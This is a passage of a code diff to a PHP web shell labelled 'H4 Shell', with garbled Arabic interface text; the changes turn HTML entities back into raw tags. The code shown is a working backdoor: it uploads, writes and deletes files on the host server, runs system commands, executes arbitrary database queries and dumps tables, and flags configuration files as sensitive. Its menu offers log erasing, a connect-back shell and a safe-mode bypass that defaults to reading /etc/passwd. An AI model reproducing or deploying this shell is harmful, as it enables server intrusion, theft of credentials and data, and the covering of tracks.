@@ -36,8 +36,8 @@ error_reporting(0);
    $site = getenv("HTTP_HOST");
    $uname = php_uname();
    $smod = ini_get('safe_mode');
-           if ($smod == 0) { $safemode = "&lt;font color='lime'&gt;OFF&lt;/font&gt;"; }
-           else { $safemode = "&lt;font color='red'&gt;ON&lt;/font&gt;";      }
+           if ($smod == 0) { $safemode = "<font color='lime'>OFF</font>"; }
+           else { $safemode = "<font color='red'>ON</font>";      }
    $dir = realpath($_POST['dir']);
    $mkdir = $_POST['makedir'];
    $mydir = $_POST['deletedir'];
@@ -45,8 +45,8 @@ error_reporting(0);
    $us3r = exec('id');
    $p0d = exec('pwd');
    $v = @ini_get("open_basedir");
-if ($v or strtolower($v) == "on") {$openbasedir = true; $hopenbasedir = "&lt;font color=red&gt;".$v."&lt;/font&gt;";}
-else {$openbasedir = false; $hopenbasedir = "&lt;font color=lime&gt;OFF&lt;/font&gt;";}
+if ($v or strtolower($v) == "on") {$openbasedir = true; $hopenbasedir = "<font color=red>".$v."</font>";}
+else {$openbasedir = false; $hopenbasedir = "<font color=lime>OFF</font>";}
    $host = $_POST['host'];
    $proto = $_POST['protocol'];
    $delete = $_POST['delete'];
@@ -59,11 +59,11 @@ else {$openbasedir = false; $hopenbasedir = "&lt;font color=lime&gt;OFF&lt;/font
    $quotes = get_magic_quotes_gpc();
 if ($quotes == "1" or $quotes == "on")
    {
-       $quot = "&lt;font color='red'&gt;ON&lt;/font&gt;";
+       $quot = "<font color='red'>ON</font>";
    }
    else
    {
-       $quot = "&lt;font color='lime'&gt;OFF&lt;/font&gt;";
+       $quot = "<font color='lime'>OFF</font>";
    }
    
    // ÇáÊÕÇÑíÍ 
@@ -92,9 +92,9 @@ if (!$free) {$free = 0;}
 if (!$all) {$all = 0;}
 function view_size($size)
 {
-if($size &gt;= 1073741824) {$size = @round($size / 1073741824 * 100) / 100 . " GB";}
-elseif($size &gt;= 1048576) {$size = @round($size / 1048576 * 100) / 100 . " MB";}
-elseif($size &gt;= 1024) {$size = @round($size / 1024 * 100) / 100 . " KB";}
+if($size >= 1073741824) {$size = @round($size / 1073741824 * 100) / 100 . " GB";}
+elseif($size >= 1048576) {$size = @round($size / 1048576 * 100) / 100 . " MB";}
+elseif($size >= 1024) {$size = @round($size / 1024 * 100) / 100 . " KB";}
 else {$size = $size . " B";}
 return $size;
 }
@@ -117,7 +117,7 @@ die(phpinfo());
    $ctd = fopen($name,"w+");
    fwrite($ctd, stripslashes($src));
    fclose($ctd);
-   echo "&lt;script&gt;alert('Êã ÅäÔÇÁ ÇáãÌáÏ')&lt;/script&gt;";
+   echo "<script>alert('Êã ÅäÔÇÁ ÇáãÌáÏ')</script>";
    $dir = $dir.$_POST['darezz'];
    chdir(realpath('.'));
       }
@@ -130,11 +130,11 @@ die(phpinfo());
 if($_POST['dare'] != realpath("."))  { $name = $_POST['dare'].$name; }
    if(move_uploaded_file($path, $name))
    {
-      echo "&lt;script&gt;alert('Êã ÑÝÚ ÇáãáÝ ÈäÌÇÍ')&lt;/script&gt;";
+      echo "<script>alert('Êã ÑÝÚ ÇáãáÝ ÈäÌÇÍ')</script>";
    }
    else
    {
-      echo "&lt;script&gt;alert('ÎØÇÁ áã íÊã ÇáÑÝÚ')&lt;/script&gt;";
+      echo "<script>alert('ÎØÇÁ áã íÊã ÇáÑÝÚ')</script>";
 }   }
 
 // ÍÐÝ ãáÝ
@@ -144,7 +144,7 @@ if($_POST['dare'] != realpath("."))  { $name = $_POST['dare'].$name; }
       if(file_exists($delete))
       {
          unlink($delete);
-         echo "&lt;script&gt;alert('Êã ÍÐÝ ÇáãáÝ ÈäÌÇÍ')&lt;/script&gt;";
+         echo "<script>alert('Êã ÍÐÝ ÇáãáÝ ÈäÌÇÍ')</script>";
       }
 	  
 }
@@ -153,11 +153,11 @@ if($_POST['dare'] != realpath("."))  { $name = $_POST['dare'].$name; }
    
    if(isset($db) && isset($query) && isset($_POST['godb']))
 {
-   $mysql = mysql_connect("localhost", $user, $pass)or die("&lt;script&gt;alert('ÎØÇ Ýí ÇáÃÊÕÇá')&lt;/script&gt;");
+   $mysql = mysql_connect("localhost", $user, $pass)or die("<script>alert('ÎØÇ Ýí ÇáÃÊÕÇá')</script>");
    $db = mysql_select_db($db)or die(mysql_error());
    $queryz = mysql_query($query)or die(mysql_error());
-if($query) { echo "&lt;script&gt;alert('Êã ÈäÌÇÍ')&lt;/script&gt;"; }
-else { echo "&lt;script&gt;alert('ÎØÇÁ ')&lt;/script&gt;"; }
+if($query) { echo "<script>alert('Êã ÈäÌÇÍ')</script>"; }
+else { echo "<script>alert('ÎØÇÁ ')</script>"; }
 }
 
 // ÇáÃÊÕÇá ÈÞæÇÚÏ ãæÞÚ [pacucci.com]
@@ -180,7 +180,7 @@ $num_fields = mysql_num_fields($table_query);
 while ($fetch_row = mysql_fetch_array($table_query))
 {
 $insert_sql .= "INSERT INTO $table VALUES(";
-for ($n=1;$n&lt;=$num_fields;$n++)
+for ($n=1;$n<=$num_fields;$n++)
 {
 $m = $n - 1;
 $insert_sql .= "'".mysql_real_escape_string($fetch_row[$m])."', ";
@@ -209,18 +209,18 @@ die();
 if(isset($mkdir)) {
 
 mkdir($mkdir);
-if($mkdir) { echo "&lt;script&gt;alert('Êã ÅäÔÇÁ ÇáãÌáÏ ÈäÌÇÍ')&lt;/script&gt;"; } }
+if($mkdir) { echo "<script>alert('Êã ÅäÔÇÁ ÇáãÌáÏ ÈäÌÇÍ')</script>"; } }
 
 // ÍÐÝ ãÌáÏ
 
 if(isset($mydir) && $mydir != "$dir") {
 $d = dir($mydir);
-while($entry = $d-&gt;read()) {
+while($entry = $d->read()) {
 if ($entry !== "." && $entry !== "..") {
 unlink($entry);
 }
 }
-$d-&gt;close();
+$d->close();
 rmdir($mydir);
 
 }
@@ -244,10 +244,10 @@ $asdi = fopen($lola, 'a+');
 }
 if($asdi)
 {
-$textzz = '&lt;font size=1 face=Tahoma color=green&gt;Êã ÍÞä ÌãíÚ ÇáãáÝÇÊ ÈäÌÇÍ&lt;/font&gt;';
+$textzz = '<font size=1 face=Tahoma color=green>Êã ÍÞä ÌãíÚ ÇáãáÝÇÊ ÈäÌÇÍ</font>';
 }
 else {
-$textzz = '&lt;font size=1 face=Tahoma color=red&gt;ÎØÇ áã íÊã ÇáÍÞä &lt;/font&gt;';
+$textzz = '<font size=1 face=Tahoma color=red>ÎØÇ áã íÊã ÇáÍÞä </font>';
 }
 }
 
@@ -257,9 +257,9 @@ $textzz = '&lt;font size=1 face=Tahoma color=red&gt;ÎØÇ áã íÊã ÇáÍÞ�
    if($_GET['com'] == "image")
    {
    $images = array(
-   "folder"=&gt; "iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAGtSURBVHjaYmRgYGBazMf3lwENxH76pA2kbgPxPyDGkIcBgABiAGr+/+/zZwwMEgfKOwExFxCzQDEzEDMi6wcIIJAgw59z5zAMjn76lIFBWnovIZcBBBDYgP/v34Ml///7x8DIxASmf+3eDTEEHUhLXwUa4ghkHQUZABBAYAP+vXnD8Pf2bYb106czEAOA3tsPMwQggCAGvH4N1ozVRlxAWhpkiAVAAEG8AHQBCPw+cgQi+RcY6H/+MPz/9Qso+Jvh/48fDP9//gTa9I/h55IlDOyhoTBjXAECCO4FsEEfPgAjlQlDM8hAOP/rV4b/Hz/CDBAGCCCIAW/fgnn/QIEJtAWMYa4A2QzUDKZBfKCB/6CBDopSgACCeOHdO4gLQCaDNP//D9EE1MAA1Ai2Hc0VMAAQQKjRCPQKKArBAKQZpBiqGWw71AXIBgAEEMSAz58ZkL0CdgFUA9ggkAFQg/8DDWX4/h2m/wdAAIGSpRYwXq8ykAiAUbgKSK0HCCCQAaxAbAjEzkAsRKR+kBMuAPFegACCZQwQzQ41jBgAyp2/QCEFEECM/0H+pQAABBgAaE8F4JYoHyAAAAAASUVORK5CYII=",
-   "file"=&gt; "iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAMAAAAoLQ9TAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAASUExURZwAAM6urXtJSgAAAP///////0X/XP4AAAAGdFJOU///////ALO/pL8AAABDSURBVHjapI1LFgAgCAJJ4/5X7qOV1rJhNw8UJDWEIKXuiJrYlCUAJIFBHwRxTUykhh/JR0PjeSvOR6McpqAG2AQYAL10AzDbmKTEAAAAAElFTkSuQmCC",
-   "floppy"=&gt; "R0lGODlhECAQILMgIB8jVq2yyI0csGVuGcjL2v///9TY405WfqOmvjI+bHoaoQsMQxR+uubn7bu+0f///yH5BAEgIA8gLCAgICAQIBAgIAR/8CHEHlVq6HMZNEUYJGFZMiACFtxpCiBDHgLjEwogzLfZDAuBw0AsEn0eIAKocAR+E0Yls1koAn2skjLFDA7WQKlBJh6z4AEiVDZneDDFrNEwE95QRHwgaFOdSlx6CwcKdndOUQxxJgZgFgIYCjALCQN/eRUWIAsPIHggoSCdESA7"
+   "folder"=> "iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAGtSURBVHjaYmRgYGBazMf3lwENxH76pA2kbgPxPyDGkIcBgABiAGr+/+/zZwwMEgfKOwExFxCzQDEzEDMi6wcIIJAgw59z5zAMjn76lIFBWnovIZcBBBDYgP/v34Ml///7x8DIxASmf+3eDTEEHUhLXwUa4ghkHQUZABBAYAP+vXnD8Pf2bYb106czEAOA3tsPMwQggCAGvH4N1ozVRlxAWhpkiAVAAEG8AHQBCPw+cgQi+RcY6H/+MPz/9Qso+Jvh/48fDP9//gTa9I/h55IlDOyhoTBjXAECCO4FsEEfPgAjlQlDM8hAOP/rV4b/Hz/CDBAGCCCIAW/fgnn/QIEJtAWMYa4A2QzUDKZBfKCB/6CBDopSgACCeOHdO4gLQCaDNP//D9EE1MAA1Ai2Hc0VMAAQQKjRCPQKKArBAKQZpBiqGWw71AXIBgAEEMSAz58ZkL0CdgFUA9ggkAFQg/8DDWX4/h2m/wdAAIGSpRYwXq8ykAiAUbgKSK0HCCCQAaxAbAjEzkAsRKR+kBMuAPFegACCZQwQzQ41jBgAyp2/QCEFEECM/0H+pQAABBgAaE8F4JYoHyAAAAAASUVORK5CYII=",
+   "file"=> "iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAMAAAAoLQ9TAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAASUExURZwAAM6urXtJSgAAAP///////0X/XP4AAAAGdFJOU///////ALO/pL8AAABDSURBVHjapI1LFgAgCAJJ4/5X7qOV1rJhNw8UJDWEIKXuiJrYlCUAJIFBHwRxTUykhh/JR0PjeSvOR6McpqAG2AQYAL10AzDbmKTEAAAAAElFTkSuQmCC",
+   "floppy"=> "R0lGODlhECAQILMgIB8jVq2yyI0csGVuGcjL2v///9TY405WfqOmvjI+bHoaoQsMQxR+uubn7bu+0f///yH5BAEgIA8gLCAgICAQIBAgIAR/8CHEHlVq6HMZNEUYJGFZMiACFtxpCiBDHgLjEwogzLfZDAuBw0AsEn0eIAKocAR+E0Yls1koAn2skjLFDA7WQKlBJh6z4AEiVDZneDDFrNEwE95QRHwgaFOdSlx6CwcKdndOUQxxJgZgFgIYCjALCQN/eRUWIAsPIHggoSCdESA7"
    );
 header("Content-type: image/gif");
 header("Cache-control: public");
@@ -293,7 +293,7 @@ echo  base64_decode($image);
          if(is_dir($list)) {
    $typezz = "ãÌáÏ";
    $pahtw++;
-   $listf.= '&lt;tr&gt;&lt;td valign=top&gt;&lt;img src=?com=image&img=folder&gt;&lt;font size=2 face=Verdana&gt;['.$list.']&lt;td valign=top&gt;&lt;font size=2 face=Verdana&gt;'.$typezz.'&lt;/font&gt;&lt;/td&gt;&lt;td valign=top&gt;&lt;/td&gt;&lt;td valign=top&gt;&lt;font size=2 face=Verdana&gt;' . getperms($list) .'&lt;/font&gt;&lt;/td&gt;&lt;/tr&gt;'; }
+   $listf.= '<tr><td valign=top><img src=?com=image&img=folder><font size=2 face=Verdana>['.$list.']<td valign=top><font size=2 face=Verdana>'.$typezz.'</font></td><td valign=top></td><td valign=top><font size=2 face=Verdana>' . getperms($list) .'</font></td></tr>'; }
 else {
  
    $lolz = filesize($list) / 1024;
@@ -303,13 +303,13 @@ else {
    $filew++;
    $listz = "/".$list;
    if(eregi($page,$listz)) {    
-   $listf.= '&lt;tr&gt;&lt;td valign=top&gt;&lt;img src=?com=image&img=file&gt;&lt;font size=2 face=Verdana color=yellow&gt;
-'.$list.'&lt;td valign=top&gt;&lt;font size=2 face=Verdana&gt;'.
-$typezz.'&lt;/td&gt;&lt;td valign=top width=15%&gt;&lt;font size=2 face=Verdana&gt;' . 
-$lolx .' ß È&lt;/td&gt;&lt;td valign=top&gt;&lt;font size=2 face=Verdana&gt;' . getperms($list) . '&lt;/font&gt;&lt;/tr&gt;'; }
-   elseif(eregi('conf',$listz) && eregi('.php',$listz)) { $listf.= '&lt;tr&gt;&lt;td valign=top&gt;&lt;img src=?com=image&img=file&gt;&lt;font size=2 face=Verdana&gt;&lt;b&gt;&lt;b&gt;&lt;font face=Verdana color=#FF0000&gt;'.$list.' &lt;/font&gt;&lt;font face=Verdana&gt;&lt;span &gt;=---------&gt;&lt;/span&gt;&lt;/font&gt;&lt;font face=Tahoma color=#FF0000&gt; Êã ÇáÚËæÑ Úáì ãáÝ ÍÓÇÓ &lt;/font&gt;
-&lt;/b&gt;&lt;/b&gt;&lt;td valign=top&gt;&lt;font size=2 face=Verdana&gt;'.$typezz.'&lt;/td&gt;&lt;td valign=top width=15%&gt;&lt;font size=2 face=Verdana&gt;' . $lolx .' ß È&lt;/td&gt;&lt;td valign=top&gt;&lt;font size=2 face=Verdana&gt;' . getperms($list) . '&lt;/font&gt;&lt;/tr&gt;'; }
-   else {$listf.= '&lt;tr&gt;&lt;td valign=top&gt;&lt;img src=?com=image&img=file&gt;&lt;font size=2 face=Verdana&gt;'.$list.'&lt;td valign=top&gt;&lt;font size=2 face=Verdana &gt;'.$typezz.'&lt;/td&gt;&lt;td valign=top width=15%&gt;&lt;font size=2 face=Verdana&gt;' . $lolx .' ß È&lt;/td&gt;&lt;td valign=top&gt;&lt;font size=2 face=Verdana&gt;' . getperms($list) . '&lt;/font&gt;&lt;/tr&gt;'; }  }
+   $listf.= '<tr><td valign=top><img src=?com=image&img=file><font size=2 face=Verdana color=yellow>
+'.$list.'<td valign=top><font size=2 face=Verdana>'.
+$typezz.'</td><td valign=top width=15%><font size=2 face=Verdana>' . 
+$lolx .' ß È</td><td valign=top><font size=2 face=Verdana>' . getperms($list) . '</font></tr>'; }
+   elseif(eregi('conf',$listz) && eregi('.php',$listz)) { $listf.= '<tr><td valign=top><img src=?com=image&img=file><font size=2 face=Verdana><b><b><font face=Verdana color=#FF0000>'.$list.' </font><font face=Verdana><span >=---------></span></font><font face=Tahoma color=#FF0000> Êã ÇáÚËæÑ Úáì ãáÝ ÍÓÇÓ </font>
+</b></b><td valign=top><font size=2 face=Verdana>'.$typezz.'</td><td valign=top width=15%><font size=2 face=Verdana>' . $lolx .' ß È</td><td valign=top><font size=2 face=Verdana>' . getperms($list) . '</font></tr>'; }
+   else {$listf.= '<tr><td valign=top><img src=?com=image&img=file><font size=2 face=Verdana>'.$list.'<td valign=top><font size=2 face=Verdana >'.$typezz.'</td><td valign=top width=15%><font size=2 face=Verdana>' . $lolx .' ß È</td><td valign=top><font size=2 face=Verdana>' . getperms($list) . '</font></tr>'; }  }
    
    }         
    closedir($open);
@@ -320,14 +320,14 @@ $fileq = $pahtw + $filew;   }
 
 
 // ÈÏÇíÉ áÛÉ html
-echo "&lt;html&gt;
-&lt;meta http-equiv=Content-Language content=ar-sa&gt;
-&lt;meta name=GENERATOR content=Microsoft FrontPage 6.0&gt;
-&lt;meta name=ProgId content=FrontPage.Editor.Document&gt;
-&lt;meta http-equiv=Content-Type content=text/html; charset=windows-1256&gt;
+echo "<html>
+<meta http-equiv=Content-Language content=ar-sa>
+<meta name=GENERATOR content=Microsoft FrontPage 6.0>
+<meta name=ProgId content=FrontPage.Editor.Document>
+<meta http-equiv=Content-Type content=text/html; charset=windows-1256>
 
-&lt;head&gt;&lt;title&gt;$site ~ Shell H4 &lt;/title&gt;
-&lt;style&gt;
+<head><title>$site ~ Shell H4 </title>
+<style>
 table.menu {
 border-width: 0px;
 border-spacing: 2px;
@@ -370,43 +370,43 @@ background-color:black;
 color:#a6a6a6;
 border: solid 1px #900000;
 }
-&lt;/style&gt;
-&lt;/head&gt;
-&lt;body bgcolor='#480000' text='#ebebeb' link='#ebebeb' alink='#ebebeb' vlink='#ebebeb'&gt;
+</style>
+</head>
+<body bgcolor='#480000' text='#ebebeb' link='#ebebeb' alink='#ebebeb' vlink='#ebebeb'>
 
 
-&lt;div align=lift&gt;
-	&lt;table class=menu width=250  &gt;
-&lt;tr&gt;&lt;td&gt;
-&lt;center&gt;&lt;b&gt;&lt;font size='6' face='tahoma'&gt;!&lt;/font&gt;
-&lt;a href='".$_SERVER['HTTP_REFERER']."'&gt; 
-&lt;font face='Verdana' size='5'&gt;~ H4 Shell ~&lt;/font&gt;&lt;/a&gt;
-&lt;font size='6' face='tahoma'&gt;!&lt;/font&gt;&lt;/b&gt;
-&lt;/center&gt;
-&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;
+<div align=lift>
+	<table class=menu width=250  >
+<tr><td>
+<center><b><font size='6' face='tahoma'>!</font>
+<a href='".$_SERVER['HTTP_REFERER']."'> 
+<font face='Verdana' size='5'>~ H4 Shell ~</font></a>
+<font size='6' face='tahoma'>!</font></b>
+</center>
+</td></tr></table></div>
 
 
 
-&lt;table class=menu dir=rtl width=100%&lt;tr&gt;&lt;td&gt;
-&lt;font size='1' face='Tahoma'&gt;
-&lt;b&gt;&lt;font color=#FFFFFF&gt;ÇáæÖÚ ÇáÃãä :&lt;/font&gt;&lt;/b&gt;&lt;font color=#FF0000&gt; &lt;u&gt;$safemode&lt;/u&gt; &lt;br&gt; 
-&lt;b&gt;&lt;font color=#FFFFFF&gt;ÇáãÇÌíß  :&lt;/font&gt;&lt;/b&gt;&lt;font &gt; &lt;u&gt;$quot&lt;/u&gt; &lt;br&gt;
-&lt;b&gt;&lt;font color=#FFFFFF&gt;ÅãßÇäíÉ ÇáÊäÞá :&lt;/font&gt;&lt;/b&gt;&lt;font &gt; &lt;u&gt;$hopenbasedir&lt;/u&gt; &lt;br&gt;
-&lt;b&gt;&lt;font color=#FFFFFF&gt;ÇáÈÑãÌíÇÊ :&lt;/font&gt;&lt;/b&gt;&lt;font &gt; &lt;u&gt;$info&lt;/u&gt; &lt;br&gt;
-&lt;b&gt;&lt;font color=#FFFFFF&gt;ÃÕÏÇÑ ÇááæßÇá :&lt;/font&gt;&lt;/b&gt;&lt;font color=#FF0000&gt; &lt;u&gt;$uname&lt;/u&gt; &lt;br&gt;
-&lt;b&gt;&lt;font color=#FFFFFF&gt;ÃÕÏÇÑ Èí ÇÊÔ Èí :&lt;/font&gt;&lt;/b&gt;&lt;font color=#FF0000&gt; ".@phpversion()."&lt;/u&gt; &lt;br&gt;
-&lt;b&gt;&lt;font color=#FFFFFF&gt;ÇáãæÞÚ :&lt;/font&gt;&lt;/b&gt;&lt;font color=#FF0000&gt; &lt;u&gt;$site&lt;/u&gt; &lt;br&gt;
-&lt;b&gt;&lt;font color=#FFFFFF&gt;ÇáÓíÑÝÑ :&lt;/font&gt;&lt;/b&gt;&lt;font color=#FF0000&gt; &lt;u&gt;" . $_SERVER['SERVER_NAME'] . "&lt;/u&gt; &lt;br&gt;
-&lt;b&gt;&lt;font color=#FFFFFF&gt;ãÓÇÑ ÇáÔá :&lt;/font&gt;&lt;/b&gt;&lt;font color=#FF0000&gt; &lt;u&gt;" . $_SERVER['SCRIPT_FILENAME'] . "&lt;/u&gt; &lt;br&gt;
-&lt;b&gt;&lt;font color=#FFFFFF&gt;ãÓÇÑß ÇáÍÇáí :&lt;/font&gt;&lt;/b&gt;&lt;font color=#FF0000&gt; &lt;u&gt;$dir&lt;/u&gt; &lt;br&gt;
-&lt;b&gt;&lt;font color=#FFFFFF&gt;ÕáÇÍíÇÊß :&lt;/font&gt;&lt;/b&gt;&lt;font color=#FF0000&gt; &lt;u&gt;$us3r&lt;/u&gt; &lt;br&gt;
-&lt;/font&gt;&lt;font color=#FFFFFF&gt; &lt;b&gt;ÇáãÓÇÍå ÇáßáíÉ  :&lt;/b&gt;&lt;/font&gt;&lt;font color=#FF0000&gt; &lt;u&gt;".view_size($all)."&lt;/u&gt; 
-&lt;/font&gt;&lt;font color=#FFFFFF&gt; -&lt;/font&gt;&lt;font color=#FF0000&gt; &lt;/font&gt;
-&lt;font color=#FFFFFF&gt;&lt;b&gt; ÇáãÓÇÍå ÇáÍÑå :&lt;/b&gt;&lt;/font&gt;&lt;font color=#FF0000&gt; &lt;u&gt;".view_size($all)."&lt;/u&gt;  &lt;br&gt;
-&lt;/font&gt;&lt;font color=#FFFFFF&gt; &lt;b&gt;ÚäæÇäß :&lt;/b&gt;&lt;/font&gt;&lt;font color=#FF0000&gt; &lt;u&gt;" . $_SERVER['REMOTE_ADDR'] ."&lt;/u&gt; 
-&lt;/font&gt;&lt;font color=#FFFFFF&gt; -&lt;/font&gt;&lt;font color=#FF0000&gt; &lt;/font&gt;
-&lt;font color=#FFFFFF&gt;&lt;b&gt; ÚäæÇä ÇáÓíÑÝÑ :&lt;/b&gt;&lt;/font&gt;&lt;font color=#FF0000&gt; &lt;a href='http://whois.domaintools.com/". $_SERVER['SERVER_ADDR'] ."'&gt;
-&lt;font color=#FF0000&gt;".$_SERVER['SERVER_ADDR']."&lt;/font&gt;&lt;/a&gt;&lt;/td&gt;&lt;td width=230 &gt;&lt;img alt='Embedded Image' 
+<table class=menu dir=rtl width=100%<tr><td>
+<font size='1' face='Tahoma'>
+<b><font color=#FFFFFF>ÇáæÖÚ ÇáÃãä :</font></b><font color=#FF0000> <u>$safemode</u> <br> 
+<b><font color=#FFFFFF>ÇáãÇÌíß  :</font></b><font > <u>$quot</u> <br>
+<b><font color=#FFFFFF>ÅãßÇäíÉ ÇáÊäÞá :</font></b><font > <u>$hopenbasedir</u> <br>
+<b><font color=#FFFFFF>ÇáÈÑãÌíÇÊ :</font></b><font > <u>$info</u> <br>
+<b><font color=#FFFFFF>ÃÕÏÇÑ ÇááæßÇá :</font></b><font color=#FF0000> <u>$uname</u> <br>
+<b><font color=#FFFFFF>ÃÕÏÇÑ Èí ÇÊÔ Èí :</font></b><font color=#FF0000> ".@phpversion()."</u> <br>
+<b><font color=#FFFFFF>ÇáãæÞÚ :</font></b><font color=#FF0000> <u>$site</u> <br>
+<b><font color=#FFFFFF>ÇáÓíÑÝÑ :</font></b><font color=#FF0000> <u>" . $_SERVER['SERVER_NAME'] . "</u> <br>
+<b><font color=#FFFFFF>ãÓÇÑ ÇáÔá :</font></b><font color=#FF0000> <u>" . $_SERVER['SCRIPT_FILENAME'] . "</u> <br>
+<b><font color=#FFFFFF>ãÓÇÑß ÇáÍÇáí :</font></b><font color=#FF0000> <u>$dir</u> <br>
+<b><font color=#FFFFFF>ÕáÇÍíÇÊß :</font></b><font color=#FF0000> <u>$us3r</u> <br>
+</font><font color=#FFFFFF> <b>ÇáãÓÇÍå ÇáßáíÉ  :</b></font><font color=#FF0000> <u>".view_size($all)."</u> 
+</font><font color=#FFFFFF> -</font><font color=#FF0000> </font>
+<font color=#FFFFFF><b> ÇáãÓÇÍå ÇáÍÑå :</b></font><font color=#FF0000> <u>".view_size($all)."</u>  <br>
+</font><font color=#FFFFFF> <b>ÚäæÇäß :</b></font><font color=#FF0000> <u>" . $_SERVER['REMOTE_ADDR'] ."</u> 
+</font><font color=#FFFFFF> -</font><font color=#FF0000> </font>
+<font color=#FFFFFF><b> ÚäæÇä ÇáÓíÑÝÑ :</b></font><font color=#FF0000> <a href='http://whois.domaintools.com/". $_SERVER['SERVER_ADDR'] ."'>
+<font color=#FF0000>".$_SERVER['SERVER_ADDR']."</font></a></td><td width=230 ><img alt='Embedded Image' 
   src='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAOsAAACgCAIAAABi9wwtAAAABGdBTUEAAK/INwWK6QAAABl0RVh0
 U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAJAHSURBVHja7H0JmGRXWfY55+731t779PTM
 JJkJIYkhkAAiIoqICIq4K4r+Ku67iAjiAggCIgLK+rMoiLL8yCqLEnZCCGQPgUlmycz03l173f3e
@@ -1055,25 +1055,25 @@ ojDisJeODbHO/PCX7/zav7n3n55/y81gDUkU/OJv/u8Lf/aO49WqyYYICTC3AGBARXJ6kpQu0vW1
 +lLweSoHnNZt27asXhium6xxDp4YwQFiFYhLUvjghm2Nml6FmwGPLTAZVJpHtABb84hX2TE6NOR6
 jsGFTAEhxGA+ibANO8zSB05NrHTbQZIQw7S4gbx3IlQD9hblRjSV3jbiNLUEkwbppInPTANQhMlC
 mqiKEdiT3lRYn/u5Xi42Ur7AUtK5EtaBWmTwDkaSIgefS/jS5bxmug3LqximZ7kWWDAEzVQZK3bH
-aCwSMj4Anx2LNN/KyP84/sdx2R7/XYABAKFt8e+QV1j1AAAAAElFTkSuQmCC' /&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;  
+aCwSMj4Anx2LNN/KyP84/sdx2R7/XYABAKFt8e+QV1j1AAAAAElFTkSuQmCC' /></td></tr></table>  
 
-&lt;table class=menu width=100% &lt;tr&gt;&lt;td&gt;
-&lt;form method='post' action=''&gt;
-&lt;center&gt;&lt;input type=submit value='ÅÏÇÑÉ ÇáãáÝÇÊ' name=filelist&gt; - &lt;input type=submit value='ãÚáæãÇÊ ÇáÓíÑÝÑ' name=phpinfo&gt; - &lt;input type=submit value='ÊÔÝíÑ ÇáÈÇÓæÑÏÇÊ' name='encoder'&gt; - &lt;input type='submit' value='ÅÑÓÇá Åíãíá' name='mail'&gt; - &lt;input type='submit' name='logeraser' value='ãÓÍ ÇáÃËÑ'&gt; - &lt;input type='submit' name='connectback' value='ÇáÅÊÕÇá ÇáÚßÓí'&gt; - &lt;input type='submit' name='safemodz' value='ÊÎØí ÇáæÖÚ ÇáÃãä'&gt; &lt;/form&gt;&lt;/center&gt;&lt;/td&gt;&lt;/tr&gt;";
+<table class=menu width=100% <tr><td>
+<form method='post' action=''>
+<center><input type=submit value='ÅÏÇÑÉ ÇáãáÝÇÊ' name=filelist> - <input type=submit value='ãÚáæãÇÊ ÇáÓíÑÝÑ' name=phpinfo> - <input type=submit value='ÊÔÝíÑ ÇáÈÇÓæÑÏÇÊ' name='encoder'> - <input type='submit' value='ÅÑÓÇá Åíãíá' name='mail'> - <input type='submit' name='logeraser' value='ãÓÍ ÇáÃËÑ'> - <input type='submit' name='connectback' value='ÇáÅÊÕÇá ÇáÚßÓí'> - <input type='submit' name='safemodz' value='ÊÎØí ÇáæÖÚ ÇáÃãä'> </form></center></td></tr>";
 
 // ÊÎØí ÇáæÖÚ ÇáÃãä Úä ØÑíÞ Bypass
 if(isset($_POST['safemodz']))
 {
-echo "&lt;tr&gt;&lt;td valign=top width=50%&gt;
-&lt;center&gt;&lt;b&gt;&lt;font size='2' face='tahoma'&gt; ÓÍÈ ãáÝ &lt;br&gt;&lt;/font&gt;&lt;/b&gt;
-&lt;form action='' method='post'&gt;
-      &lt;font size='1' face='tahoma'&gt;ãÓÇÑ ÇáãáÝ:&lt;/font&gt;&lt;br&gt; &lt;input type='text' name='filew' value='/etc/passwd'&gt; &lt;input type='submit' value='äÝÐ' name='redfi'&gt;&lt;/font&gt;&lt;br&gt;
-     &lt;/td&gt;&lt;tr&gt;
-&lt;td valign=top&gt;
-&lt;center&gt;&lt;b&gt;&lt;font size='2' face='tahoma'&gt;ÓÍÈ ãÌáÏ &lt;br&gt;&lt;/font&gt;&lt;/b&gt;
-   &lt;form method='post' action=''&gt;
-   &lt;font size='1' face='tahoma'&gt;ãÓÇÑ ÇáãÌáÏ :&lt;/font&gt;&lt;br&gt;
-   &lt;input type='text' name='directory' value='" . $_SERVER['DOCUMENT_ROOT'] . "/'&gt;  &lt;input type='submit' value='äÝÐ' name='reddi'&gt;&lt;/form&gt;";
+echo "<tr><td valign=top width=50%>
+<center><b><font size='2' face='tahoma'> ÓÍÈ ãáÝ <br></font></b>
+<form action='' method='post'>
+      <font size='1' face='tahoma'>ãÓÇÑ ÇáãáÝ:</font><br> <input type='text' name='filew' value='/etc/passwd'> <input type='submit' value='äÝÐ' name='redfi'></font><br>
+     </td><tr>
+<td valign=top>
+<center><b><font size='2' face='tahoma'>ÓÍÈ ãÌáÏ <br></font></b>
+   <form method='post' action=''>
+   <font size='1' face='tahoma'>ãÓÇÑ ÇáãÌáÏ :</font><br>
+   <input type='text' name='directory' value='" . $_SERVER['DOCUMENT_ROOT'] . "/'>  <input type='submit' value='äÝÐ' name='reddi'></form>";
   }
    // ÓÍÈ ãáÝ
 if(isset($_POST['redfi']))
@@ -1086,10 +1086,10 @@ if(isset($_POST['redfi']))
     $freadz = fread($fopenzo, filesize($tempp));
     fclose($fopenzo);
     $source = htmlspecialchars($freadz);
